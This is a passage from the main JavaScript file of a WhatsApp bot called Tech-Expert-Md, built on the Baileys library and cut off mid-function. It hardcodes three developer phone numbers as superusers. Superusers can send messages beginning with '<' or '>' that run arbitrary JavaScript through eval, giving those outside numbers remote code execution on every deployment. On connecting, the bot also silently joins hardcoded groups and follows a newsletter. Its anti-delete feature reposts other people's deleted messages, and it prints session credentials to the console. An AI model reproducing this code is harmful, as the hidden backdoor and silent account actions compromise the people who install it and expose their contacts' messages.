import express from 'express';
import { Boom } from '@hapi/boom';
import { 
    default as makeWASocket, 
    makeInMemoryStore, 
    useMultiFileAuthState, 
    makeCacheableSignalKeyStore, 
    fetchLatestBaileysVersion,
    delay as baileysDelay,
    downloadContentFromMessage,
    DisconnectReason,
    getContentType,
    jidDecode
} from '@whiskeysockets/baileys';
import logger from '@whiskeysockets/baileys/lib/Utils/logger';
import pino from 'pino';
import axios from 'axios';
import fs from 'fs-extra';
import path from 'path';
import { fileTypeFromBuffer } from 'file-type';
import { Sticker, StickerTypes } from 'wa-sticker-formatter';
import chalk from 'chalk';
import { inflate, deflate } from 'pako';
import { verifierEtatJid, recupererActionJid } from './lib/antilien.js';
import { atbverifierEtatJid, atbrecupererActionJid } from './lib/antibot.js';
import { sendMessage, getContextInfo } from './fredi/context.js';
import evt from './fredi/ezra.js';
import { isUserBanned, addUserToBanList, removeUserFromBanList } from './lib/banUser.js';
import { addGroupToBanList, isGroupBanned, removeGroupFromBanList } from './lib/banGroup.js';
import { isGroupOnlyAdmin, addGroupToOnlyAdminList, removeGroupFromOnlyAdminList } from './lib/onlyAdmin.js';
import { reagir } from './fredi/app.js';
import conf from './set.js';

// Express server
const app = express();
const PORT = process.env.PORT || 8000;
app.get("/", (req, res) => {
    res.send("Tech-Expert-Md IS ALIVE 🫧");
});
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// Constants
const prefixe = conf.PREFIXE;
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const BaseUrl = process.env.GITHUB_GIT;
const Ezraapikey = process.env.BOT_OWNER;

// Fonction pour decompresser session ya zlib base64
function decompressZlibBase64Session(compressedSession) {
    try {
        if (!compressedSession || compressedSession.trim() === '') {
            console.log("Session is empty");
            return null;
        }
        
        // Remove FEE-XMD% prefix if exists
        const cleanSession = compressedSession.replace(/FEE-XMD%/g, "");
        console.log("Cleaned session length:", cleanSession.length);
        
        // Decode base64
        const base64Data = atob(cleanSession);
        
        // Convert to Uint8Array for zlib decompression
        const uint8Array = new Uint8Array(base64Data.length);
        for (let i = 0; i < base64Data.length; i++) {
            uint8Array[i] = base64Data.charCodeAt(i);
        }
        
        // Decompress zlib using pako
        const decompressed = inflate(uint8Array);
        
        // Convert to string
        const sessionString = new TextDecoder().decode(decompressed);
        console.log("Session decompressed successfully, length:", sessionString.length);
        
        return sessionString;
    } catch (error) {
        console.error("Error decompressing session:", error);
        console.error("Error stack:", error.stack);
        return null;
    }
}

// Fonction pour compress session to zlib base64
function compressToZlibBase64(sessionData) {
    try {
        // Convert string to Uint8Array
        const encoder = new TextEncoder();
        const uint8Array = encoder.encode(sessionData);
        
        // Compress with zlib using pako
        const compressed = deflate(uint8Array);
        
        // Convert to base64
        let binaryString = '';
        for (let i = 0; i < compressed.length; i++) {
            binaryString += String.fromCharCode(compressed[i]);
        }
        
        const base64Result = btoa(binaryString);
        console.log("Session compressed to base64, length:", base64Result.length);
        
        return "FEE-XMD%" + base64Result;
    } catch (error) {
        console.error("Error compressing session:", error);
        return null;
    }
}

async function authentification() {
    try {
        const session = conf.session || '';
        console.log("Session from config:", session ? "Provided" : "Empty");
        
        if (!fs.existsSync(path.join(__dirname, "/scan/creds.json"))) {
            console.log("Connexion en cours avec session base64 zlib...");
            
            if (session) {
                // Decompress session
                const decompressedSession = decompressZlibBase64Session(session);
                
                if (decompressedSession) {
                    await fs.writeFileSync(path.join(__dirname, "/scan/creds.json"), decompressedSession, "utf8");
                    console.log("Session decompressée et enregistrée avec succès");
                    return true;
                } else {
                    console.log("Session invalide ou erreur de décompression");
                    console.log("QR code sera affiché pour nouvelle connexion");
                    return false;
                }
            } else {
                console.log("Pas de session fournie, QR code sera affiché");
                return false;
            }
        } else if (fs.existsSync(path.join(__dirname, "/scan/creds.json")) && session && session !== "zokk") {
            // Mise à jour de la session
            const decompressedSession = decompressZlibBase64Session(session);
            
            if (decompressedSession) {
                await fs.writeFileSync(path.join(__dirname, "/scan/creds.json"), decompressedSession, "utf8");
                console.log("Session mise à jour avec succès");
                return true;
            }
        }
        
        return true;
    } catch (e) {
        console.log("Erreur d'authentification: " + e);
        console.error(e.stack);
        return false;
    }
}

// Store setup
const store = makeInMemoryStore({
    logger: pino().child({ level: "silent", stream: "store" }),
});

// 50 Raw Emojis only (mixed categories)
const reactionEmojis = [
    // Smileys & People
    "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "🥲", "☺️",
    "😊", "😇", "🙂", "🙃", "😉", "😌", "😍", "🥰", "😘", "😗",
    // Hands & Gestures
    "👋", "🤚", "🖐️", "✋", "🖖", "👌", "🤌", "🤏", "✌️", "🤞",
    // Objects
    "💎", "🔥", "💫", "⭐", "🌟", "✨", "🎉", "🎊", "🏆", "🎯",
    // Nature
    "🌹", "🌸", "🌺", "🌻", "🌼", "🌷", "💐", "🌱", "🌿", "🍃",
    // Misc
    "❤️", "💖", "💕", "💞", "💓", "💗", "💘", "💝", "💟", "☮️"
];

// Get random emoji
const getRandomEmoji = () => {
    return reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
};

setTimeout(async () => {
    await authentification();
    
    async function main() {
        const { version, isLatest } = await fetchLatestBaileysVersion();
        
        // Utiliser useMultiFileAuthState pour charger les creds
        const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "/scan"));
        
        // Configuration du socket
        const sockOptions = {
            version,
            logger: pino({ level: "silent" }),
            browser: ['Fee-Xmd', "safari", "1.0.0"],
            printQRInTerminal: true,
            fireInitQueries: false,
            shouldSyncHistoryMessage: true,
            downloadHistory: true,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false,
            keepAliveIntervalMs: 30000,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
                    return msg.message || undefined;
                }
                return {
                    conversation: 'An Error Occurred, Repeat Command!'
                };
            }
        };
        
        // Créer le socket
        const zk = makeWASocket(sockOptions);
        
        // Bind store to socket events
        store.bind(zk.ev);
        
        // Sauvegarder les creds quand ils changent
        zk.ev.on('creds.update', saveCreds);
        
        // Fonction pour sauvegarder la session en format zlib base64
        async function saveSessionToZlibBase64() {
            try {
                if (fs.existsSync(path.join(__dirname, "/scan/creds.json"))) {
                    const sessionData = await fs.readFileSync(path.join(__dirname, "/scan/creds.json"), "utf8");
                    const compressedSession = compressToZlibBase64(sessionData);
                    
                    if (compressedSession) {
                        console.log(chalk.green("\n" + "═".repeat(50)));
                        console.log(chalk.yellow.bold("SESSION COMPRESSÉE (Zlib Base64):"));
                        console.log(chalk.green("═".repeat(50)));
                        console.log(chalk.cyan(compressedSession));
                        console.log(chalk.green("═".repeat(50)));
                        console.log(chalk.yellow("Copiez cette session et collez-la dans votre fichier set.js"));
                        console.log(chalk.green("═".repeat(50) + "\n"));
                        
                        // Optionnel: Sauvegarder dans un fichier
                        await fs.writeFileSync(
                            path.join(__dirname, "/session_compressed.txt"),
                            compressedSession,
                            "utf8"
                        );
                        
                        console.log(chalk.green("Session sauvegardée dans: session_compressed.txt"));
                    }
                }
            } catch (error) {
                console.error("Erreur lors de la sauvegarde de la session:", error);
            }
        }
        
        // Function to get the current date and time in Tanzania
        function getCurrentDateTime() {
            const now = new Date();
            const options = {
                timeZone: 'Africa/Nairobi',
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false,
            };
            return new Intl.DateTimeFormat('en-KE', options).format(now);
        }

        // Dynamic Bio Lines
        const bioLines = [
            "🛠️ Learning never ends — debug life!",
            "🔥 Bot powered by memes & dreams 😎",
            "🎯 Skills don't sleep... neither do bots 🤖",
            "💡 Every day is a code update day!",
            "📅 Stay productive — even in downtime!",
            "😂 If bots had feelings... mine would be busy.",
            "🚀 Running like a boss at 1000 scripts/sec.",
            "🌍 Global bot vibes from TZ 🇹🇿",
            "📚 Guide, Help, Fun, Repeat.",
            "🤹 Life is a mix of memes & miracles."
        ];

        // Rotate bios
        let bioIndex = 0;
        if (conf.AUTO_BIO === "yes") {
            setInterval(async () => {
                const currentDateTime = getCurrentDateTime();
                const dynamicLine = bioLines[bioIndex];
                const bioText = `🤖 Tech-Expert-Md is Active\n📅 ${currentDateTime}\n${dynamicLine}`;
                
                await zk.updateProfileStatus(bioText);
                console.log(`✅ Updated Bio:\n${bioText}`);
                
                bioIndex = (bioIndex + 1) % bioLines.length;
            }, 60000);
        }

        // Anti-call feature
        zk.ev.on("call", async (callData) => {
            if (conf.ANTI_CALL === 'yes' && callData[0]) {
                const callId = callData[0].id;
                const callerId = callData[0].from;

                await zk.rejectCall(callId, callerId);

                if (!global.callResponses) global.callResponses = {};
                if (!global.callResponses[callerId]) global.callResponses[callerId] = { count: 0 };

                const callerData = global.callResponses[callerId];
                callerData.count++;

                const callMessages = {
                    1: [
                        `📞 Hello 👋! I'm ${conf.BOT}. Please avoid calling, my owner ${conf.OWNER_NAME} prefers messages. Thank you!\n\nPowered by ${conf.DEV}`,
                        `🚫 Please don't call. ${conf.BOT} is a bot, not a voice assistant.\n\nPowered by ${conf.DEV}`,
                        `Hi! 🙏 Kindly don't call. My creator ${conf.OWNER_NAME} has disabled calling. Just message me.\n\n~ ${conf.BOT}`
                    ],
                    2: [
                        `⚠️ You've called again. Calls are not allowed. Please text.\n\nPowered by ${conf.DEV}`,
                        `Reminder: No calls allowed 🚫. Kindly send your message instead.`,
                        `You're trying again? 😅 This bot does not accept calls. Just type your message.`
                    ],
                    3: [
                        `📵 Third time calling! Respect the rules and drop a message please.`,
                        `Hey friend, this is the 3rd call. Please avoid that 🙏.`,
                        `Still calling? 😔 Please understand, texting is preferred.`
                    ],
                };

                const level = callerData.count >= 3 ? 3 : callerData.count;
                const messages = callMessages[level];
                const randomMessage = messages[Math.floor(Math.random() * messages.length)];

                try {
                    await zk.sendMessage(callerId, { text: randomMessage });
                } catch (e) {
                    console.error("Error sending anti-call message:", e);
                }
            }
        });

        // Auto-reply feature
        let auto_reply_message = `Hello👋, I'm ${conf.BOT} on board. My owner ${conf.OWNER_NAME} currently unavailable👁️. Please leave a message, and we will get back to you as soon as possible🤝. Thanks To ${conf.DEV}`;
        let repliedContacts = new Set();

        // Anti-delete feature
        if (conf.LUCKY_ADM === "yes") {
            console.log("🛡️ Tech-Expert-Md AntiDelete is ACTIVE!");
        }

        // Auto-react settings
        let lastReactionTime = 0;
        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

        // Main message handler
        zk.ev.on("messages.upsert", async (m) => {
            const { messages } = m;
            const ms = messages[0];
            if (!ms.message) return;

            const messageText = ms.message.conversation || ms.message.extendedTextMessage?.text;
            const remoteJid = ms.key.remoteJid;

            // Handle auto-reply message update
            if (messageText && messageText.match(/^[^\w\s]/) && ms.key.fromMe) {
                const prefix = messageText[0];
                const command = messageText.slice(1).split(" ")[0];
                const newMessage = messageText.slice(prefix.length + command.length).trim();

                if (command === "setautoreply" && newMessage) {
                    auto_reply_message = newMessage;
                    await zk.sendMessage(remoteJid, {
                        text: `Auto-reply message has been updated to:\n"${auto_reply_message}"`,
                    });
                    return;
                }
            }

            // Auto-reply to private messages
            if (conf.AUTO_REPLY === "yes" && !repliedContacts.has(remoteJid) && !ms.key.fromMe && !remoteJid.includes("@g.us")) {
                await zk.sendMessage(remoteJid, {
                    text: auto_reply_message,
                });
                repliedContacts.add(remoteJid);
            }

            // Anti-delete logic
            if (conf.LUCKY_ADM === "yes" && ms.message?.protocolMessage?.type === 0) {
                const deletedKey = ms.message.protocolMessage.key;
                const chatMessages = store.chats[remoteJid] || [];
                const deletedMessage = chatMessages.find(msg => msg.key.id === deletedKey.id);

                if (deletedMessage) {
                    try {
                        const deleterJid = ms.key.participant || ms.key.remoteJid;
                        const originalSenderJid = deletedMessage.key.participant || deletedMessage.key.remoteJid;
                        const isGroup = remoteJid.endsWith('@g.us');

                        let groupInfo = '';
                        if (isGroup) {
                            try {
                                const groupMetadata = await zk.groupMetadata(remoteJid);
                                groupInfo = `\n• Group: ${groupMetadata.subject}`;
                            } catch (e) {
                                console.error('Error fetching group metadata:', e);
                                groupInfo = '\n• Group information unavailable.';
                            }
                        }

                        const notification = `🫧 *Tech-Expert-Md antiDelete* 🫧\n` +
                            `• Deleted by: @${deleterJid.split("@")[0]}\n` +
                            `• Original sender: @${originalSenderJid.split("@")[0]}\n` +
                            `${groupInfo}\n` +
                            `• Chat type: ${isGroup ? 'Group' : 'Private'}`;

                        const baseOpts = {
                            mentions: [deleterJid, originalSenderJid]
                        };

                        // Handle different message types
                        if (deletedMessage.message.conversation) {
                            await sendMessage(zk, remoteJid, ms, {
                                text: `${notification}\n\n📝 *Deleted Text:*\n${deletedMessage.message.conversation}`,
                                ...baseOpts
                            });
                        } else if (deletedMessage.message.extendedTextMessage) {
                            await sendMessage(zk, remoteJid, ms, {
                                text: `${notification}\n\n📝 *Deleted Text:*\n${deletedMessage.message.extendedTextMessage.text}`,
                                ...baseOpts
                            });
                        } else if (deletedMessage.message.imageMessage) {
                            const caption = deletedMessage.message.imageMessage.caption || '';
                            const imagePath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.imageMessage);
                            await sendMessage(zk, remoteJid, ms, {
                                image: { url: imagePath },
                                caption: `${notification}\n\n🖼️ *Image Caption:*\n${caption}`,
                                ...baseOpts
                            });
                        } else if (deletedMessage.message.videoMessage) {
                            const caption = deletedMessage.message.videoMessage.caption || '';
                            const videoPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.videoMessage);
                            await sendMessage(zk, remoteJid, ms, {
                                video: { url: videoPath },
                                caption: `${notification}\n\n🎥 *Video Caption:*\n${caption}`,
                                ...baseOpts
                            });
                        } else if (deletedMessage.message.audioMessage) {
                            const audioPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.audioMessage);
                            await sendMessage(zk, remoteJid, ms, {
                                audio: { url: audioPath },
                                mimetype: 'audio/ogg',
                                ptt: true,
                                caption: `${notification}\n\n🎤 *Voice Message Deleted*`,
                                ...baseOpts
                            });
                        } else if (deletedMessage.message.stickerMessage) {
                            const stickerPath = await zk.downloadAndSaveMediaMessage(deletedMessage.message.stickerMessage);
                            await sendMessage(zk, remoteJid, ms, {
                                sticker: { url: stickerPath },
                                caption: notification,
                                ...baseOpts
                            });
                        } else {
                            await sendMessage(zk, remoteJid, ms, {
                                text: `${notification}\n\n⚠️ *An unsupported message type was deleted.*`,
                                ...baseOpts
                            });
                        }
                    } catch (err) {
                        console.error("🔥 AntiDelete Error:", err);
                    }
                }
            }

            // Auto-react to messages
            if (conf.AUTO_REACT === "yes" && !ms.key.fromMe) {
                const now = Date.now();
                if (now - lastReactionTime > 5000) {
                    const randomEmoji = getRandomEmoji();
                    try {
                        await zk.sendMessage(remoteJid, {
                            react: {
                                text: randomEmoji,
                                key: ms.key
                            }
                        });
                        lastReactionTime = now;
                        console.log(`Reacted with ${randomEmoji} to message from ${remoteJid}`);
                    } catch (error) {
                        console.error("Failed to react:", error);
                    }
                }
            }

            // Auto-react to status updates
            if (conf.AUTO_REACT_STATUS === "yes" && remoteJid === "status@broadcast") {
                const now = Date.now();
                if (now - lastReactionTime > 5000) {
                    const randomEmoji = getRandomEmoji();
                    try {
                        const ezra = zk.user?.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
                        if (ezra) {
                            await zk.sendMessage(remoteJid, {
                                react: {
                                    key: ms.key,
                                    text: randomEmoji,
                                },
                            }, {
                                statusJidList: [ms.key.participant, ezra],
                            });
                            lastReactionTime = now;
                            console.log(`Reacted with ${randomEmoji} to status update`);
                        }
                    } catch (error) {
                        console.error("Failed to react to status:", error);
                    }
                }
            }

            // Continue with message processing
            const decodeJid = (jid) => {
                if (!jid) return jid;
                if (/:\d+@/gi.test(jid)) {
                    let decode = jidDecode(jid) || {};
                    return decode.user && decode.server && decode.user + '@' + decode.server || jid;
                } else {
                    return jid;
                }
            };

            var mtype = getContentType(ms.message);
            var texte = mtype == "conversation" ? ms.message.conversation : 
                        mtype == "imageMessage" ? ms.message.imageMessage?.caption : 
                        mtype == "videoMessage" ? ms.message.videoMessage?.caption : 
                        mtype == "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : 
                        mtype == "buttonsResponseMessage" ? ms?.message?.buttonsResponseMessage?.selectedButtonId : 
                        mtype == "listResponseMessage" ? ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : 
                        mtype == "messageContextInfo" ? (ms?.message?.buttonsResponseMessage?.selectedButtonId || 
                        ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";

            var origineMessage = ms.key.remoteJid;
            var idBot = decodeJid(zk.user.id);
            var servBot = idBot.split('@')[0];
            const verifGroupe = origineMessage?.endsWith("@g.us");
            var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage).catch(() => null) : null;
            var nomGroupe = verifGroupe && infosGroupe ? infosGroupe.subject : "";
            var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
            var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
            var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
            
            if (ms.key.fromMe) {
                auteurMessage = idBot;
            }
            
            var membreGroupe = verifGroupe ? ms.key.participant : '';
            const { getAllSudoNumbers } = await import('./lib/sudo.js');
            const nomAuteurMessage = ms.pushName;
            const fredietech = '255752593977';
            const meshack = '255711389698';
            const ezra = "255764182801";
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, fredietech, meshack, ezra, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            
            var dev = [fredietech, ezra].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            
            function repondre(mes) { 
                zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); 
            }
            
            console.log("Tech-Expert-Md");
            console.log("=========== NEW CONVERSATION ===========");
            if (verifGroupe) {
                console.log("MESSAGE FROM GROUP : " + nomGroupe);
            }
            console.log("MESSAGE SENT BY : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
            console.log("MESSAGE TYPE : " + mtype);
            console.log("==================TEXT==================");
            console.log(texte);
            
            // Auto read messages
            if (conf.AUTO_READ === 'yes') {
                if (!ms.key.fromMe) {
                    await zk.readMessages([ms.key]);
                }
            }

            // Auto-block
            if (!superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
                zk.sendMessage(auteurMessage, {
                    'text': `🚫am blocking you because you have violated ${conf.OWNER_NAME} policies🚫!`
                });
                await zk.updateBlockStatus(auteurMessage, 'block');
            }

            // Eval commands
            if (texte && texte.startsWith('<')) {
                if (!superUser) {
                    return repondre(`Only for my ${conf.DEV} or ${conf.OWNER_NAME} to use this command 🚫`);
                }
                
                try { 
                    let evaled = await eval(texte.slice(1)); 
                    if (typeof evaled !== 'string') {
                        evaled = require('util').inspect(evaled); 
                    }
                    await repondre(evaled); 
                } catch (err) { 
                    await repondre(String(err)); 
                } 
            }
            
            if (texte && texte.startsWith('>')) {
                if (!superUser) {
                    const menuText = `This command is only for the owner or Fredi AI to execute 🚫`;
                    await zk.sendMessage(origineMessage, {
                        text: menuText,
                        contextInfo: {
                            externalAdReply: {
                                title: conf.BOT,
                                body: conf.OWNER_NAME,
                                sourceUrl: conf.GURL,
                                thumbnailUrl: conf.URL,
                                mediaType: 1,
                                showAdAttribution: true,
                                renderLargerThumbnail: false
                            }
                        }
                    });
                    return; 
                }

                try {
                    let evaled = await eval(texte.slice(1));
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                    await repondre(evaled);
                } catch (err) {
                    await repondre(String(err));
                }
            }

            // Chatbot
            if (!superUser && origineMessage === auteurMessage && conf.CHAT_BOT === 'yes') {
                console.log('🤖 Chatbot is active');
                try {
                    const currentTime = Date.now();
                    let lastTextTime = 0;
                    const messageDelay = 10000;
                    
                    if (currentTime - lastTextTime < messageDelay) return;
                    
                    const response = await axios.get('https://apis-keith.vercel.app/ai/gpt', {
                        params: { q: texte },
                        timeout: 10000
                    });

                    if (response.data?.status && response.data?.result) {
                        const italicMessage = `_${response.data.result}_`;
                        await zk.sendMessage(origineMessage, {
                            text: italicMessage,
                            mentions: [auteurMessage],
                        }, { quoted: ms });
                        lastTextTime = currentTime;
                    }
                } catch (error) {
                    console.error('Chatbot error:', error);
                }
            }

            // Status reply
            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_STATUS_REPLY === "yes") {
                const user = ms.key.participant;
                const text = `${conf.AUTO_STATUS_TEXT}`;
                await zk.sendMessage(user, { 
                    text: text,
                    react: { text: '🤦', key: ms.key }
                }, { quoted: ms });
            }
            
            // Auto read status
            if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                await zk.readMessages([ms.key]);
            }
            
            // Auto download status
            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_DOWNLOAD_STATUS === "yes") {
                if (ms.message.extendedTextMessage) {
                    var stTxt = ms.message.extendedTextMessage.text;
                    await zk.sendMessage(idBot, { text: stTxt }, { quoted: ms });
                } else if (ms.message.imageMessage) {
                    var stMsg = ms.message.imageMessage.caption;
                    var stImg = await zk.downloadAndSaveMediaMessage(ms.message.imageMessage);
                    await zk.sendMessage(idBot, { image: { url: stImg }, caption: stMsg }, { quoted: ms });
                } else if (ms.message.videoMessage) {
                    var stMsg = ms.message.videoMessage.caption;
                    var stVideo = await zk.downloadAndSaveMediaMessage(ms.message.videoMessage);
                    await zk.sendMessage(idBot, {
                        video: { url: stVideo }, caption: stMsg
                    }, { quoted: ms });
                }
            }

            // Check if message is from restricted group
            if (!dev && origineMessage == "120363158701337904@g.us") {
                return;
            }

            // Mentions
            try {
                if (ms.message[mtype]?.contextInfo?.mentionedJid && 
                    (ms.message[mtype].contextInfo.mentionedJid.includes(idBot) ||  
                    ms.message[mtype].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + '@s.whatsapp.net'))) {
                    
                    if (origineMessage == "120363158701337904@g.us") {
                        return;
                    }
                    
                    if(superUser) {console.log('hummm') ; return ;} 
                    
                    let mbd = await import('./lib/mention.js');
                    let alldata = await mbd.recupererToutesLesValeurs();
                    let data = alldata[0];
                    
                    if ( data.status === 'non') { console.log('mention pas actifs') ; return ;}
                    
                    let msg;
                    if (data.type.toLowerCase() === 'image') {
                        msg = {
                            image : { url : data.url},
                            caption : data.message
                        }
                    } else if (data.type.toLowerCase() === 'video') {
                        msg = {
                            video : { url : data.url},
                            caption : data.message
                        }
                    } else if (data.type.toLowerCase() === 'sticker') {
                        let stickerMess = new Sticker(data.url, {
                            pack: conf.NOM_OWNER,
                            type: StickerTypes.FULL,
                            categories: ["🤩", "🎉"],
                            id: "12345",
                            quality: 70,
                            background: "transparent",
                        });
                        const stickerBuffer2 = await stickerMess.toBuffer();
                        msg = {
                            sticker : stickerBuffer2 
                        }
                    } else if (data.type.toLowerCase() === 'audio') {
                        msg = {
                            audio : { url : data.url },
                            mimetype:'audio/mp4',
                        }
                    }
                    
                    if (msg) {
                        zk.sendMessage(origineMessage, msg, { quoted: ms });
                    }
                }
            } catch (error) {
                console.error("Mention error:", error);
            }

            // Anti-lien
            try {
                const yes = await verifierEtatJid(origineMessage);
                if (texte && texte.includes('https://') && verifGroupe && yes) {
                    console.log("lien detecté");
                    
                    const mbre = verifGroupe && infosGroupe ? infosGroupe.participants : [];
                    const groupeAdmin = (participants) => {
                        let admin = [];
                        for (let p of participants) {
                            if (p.admin) {
                                admin.push(p.id);
                            }
                        }
                        return admin;
                    };
                    
                    let admins = verifGroupe ? groupeAdmin(mbre) : [];
                    const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
                    const verifFeeAdmin = verifGroupe ? admins.includes(idBot) : false;
                    
                    if(superUser || verifAdmin || !verifFeeAdmin) { 
                        console.log('je fais rien'); 
                        return;
                    }
                    
                    const key = {
                        remoteJid: origineMessage,
                        fromMe: false,
                        id: ms.key.id,
                        participant: auteurMessage
                    };
                    
                    var txt = "lien detected, \n";
                    const gifLink = "https://raw.githubusercontent.com/mr-X-force/LUCKY-MD-XFORCE/main/media/remover.gif";
                    var sticker = new Sticker(gifLink, {
                        pack: 'FrediEzra',
                        author: conf.OWNER_NAME,
                        type: StickerTypes.FULL,
                        categories: ['🤩', '🎉'],
                        id: '12345',
                        quality: 50,
                        background: '#000000'
                    });
                    await sticker.toFile("st1.webp");
                    
                    var action = await recupererActionJid(origineMessage);
                    
                    if (action === 'remove') {
                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group.`;
                        await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                        await baileysDelay(800);
                        await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                        try {
                            await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                        } catch (e) {
                            console.log("antiien error: " + e);
                        }
                        await zk.sendMessage(origineMessage, { delete: key });
                        await fs.unlink("st1.webp");
                    } else if (action === 'delete') {
                        txt += `message deleted \n @${auteurMessage.split("@")[0]} avoid sending link.`;
                        await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                        await zk.sendMessage(origineMessage, { delete: key });
                        await fs.unlink("st1.webp");
                    }
                }
            } catch (e) {
                console.log("lib err " + e);
            }

            // Command execution
            const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
            const verifCom = texte ? texte.startsWith(prefixe) : false;
            const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;

            if (verifCom) {
                const cd = evt.cm.find((ezra) => ezra.nomCom === (com));
                if (cd) {
                    try {
                        if ((conf.MODE).toLowerCase() != 'yes' && !superUser) {
                            return;
                        }

                        // Check permissions
                        if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
                            repondre("You don't have acces to commands here"); 
                            return;
                        }

                        // Check if group is banned
                        if (!superUser && verifGroupe) {
                            let req = await isGroupBanned(origineMessage);
                            if (req) { return; }
                        }

                        // Check if only admin commands allowed
                        if(!verifAdmin && verifGroupe) {
                            let req = await isGroupOnlyAdmin(origineMessage);
                            if (req) { return; }
                        }

                        // Check if user is banned
                        if(!superUser) {
                            let req = await isUserBanned(auteurMessage);
                            if (req) {
                                repondre("You are banned from bot commands"); 
                                return;
                            }
                        }

                        // Execute command
                        reagir(origineMessage, zk, ms, cd.reaction);
                        
                        // Prepare command options
                        const commandeOptions = {
                            superUser, 
                            dev,
                            verifGroupe,
                            mbre: infosGroupe?.participants || [],
                            membreGroupe,
                            verifAdmin,
                            infosGroupe,
                            nomGroupe,
                            auteurMessage,
                            nomAuteurMessage,
                            idBot,
                            verifEzraAdmin: verifGroupe ? (infosGroupe?.participants?.some(p => p.id === idBot && p.admin) || false) : false,
                            prefixe,
                            arg,
                            repondre,
                            mtype,
                            groupeAdmin: (participants) => {
                                let admin = [];
                                for (let p of participants) {
                                    if (p.admin) {
                                        admin.push(p.id);
                                    }
                                }
                                return admin;
                            },
                            msgRepondu,
                            auteurMsgRepondu,
                            ms,
                            mybotpic: () => {
                                const lien = conf.URL?.split(',') || [];
                                const indiceAleatoire = Math.floor(Math.random() * lien.length);
                                return lien[indiceAleatoire] || '';
                            }
                        };
                        
                        cd.fonction(origineMessage, zk, commandeOptions);
                    } catch (e) {
                        console.log("Command error: " + e);
                        zk.sendMessage(origineMessage, { text: "😡😡 " + e }, { quoted: ms });
                    }
                }
            }
        });

        // Group participants update
        zk.ev.on('group-participants.update', async (group) => {
            console.log(group);

            let ppgroup;
            try {
                ppgroup = await zk.profilePictureUrl(group.id, 'image');
            } catch {
                ppgroup = 'https://files.catbox.moe/3o37c5.jpeg';
            }

            try {
                const metadata = await zk.groupMetadata(group.id);
                const { recupevents } = await import('./lib/welcome.js');

                if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
                    let msg = `👋 Hello\n`;
                    let membres = group.participants;
                    for (let membre of membres) {
                        msg += ` *@${membre.split("@")[0]}* Welcome to Our Official Group,`;
                    }
                    msg += `You might want to read the group Description to avoid getting removed...`;
                    zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
                } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
                    let msg = `one or somes member(s) left group;\n`;
                    let membres = group.participants;
                    for (let membre of membres) {
                        msg += `@${membre.split("@")[0]}\n`;
                    }
                    zk.sendMessage(group.id, { text: msg, mentions: membres });
                }
            } catch (e) {
                console.error(e);
            }
        });

        // Connection updates
        zk.ev.on("connection.update", async (con) => {
            const { lastDisconnect, connection } = con;
            if (connection === "connecting") {
                console.log("ℹ️ Tech-Expert-Md is connecting...");
            } else if (connection === 'open') {
                await zk.groupAcceptInvite("GmKhyg4DonRCMvFVkAHPSL");
                await zk.newsletterFollow("120363313124070136@newsletter");
                await zk.groupAcceptInvite("E2jarQUgOkf3uPPzsiWdND");
                console.log("🔮 Tech-Expert-Md Connected to your WhatsApp! 🫧");
                console.log("--");
                await baileysDelay(200);
                console.log("------");
                await baileysDelay(300);
                console.log("------------------/-----");
                console.log("👀 Tech-Expert-Md is Online 🕸\n\n");
                
                // Load plugins
                console.log("🛒 Loading Tech-Expert-Md Plugins...\n");
                fs.readdirSync(path.join(__dirname, "/plugins")).forEach((fichier) => {
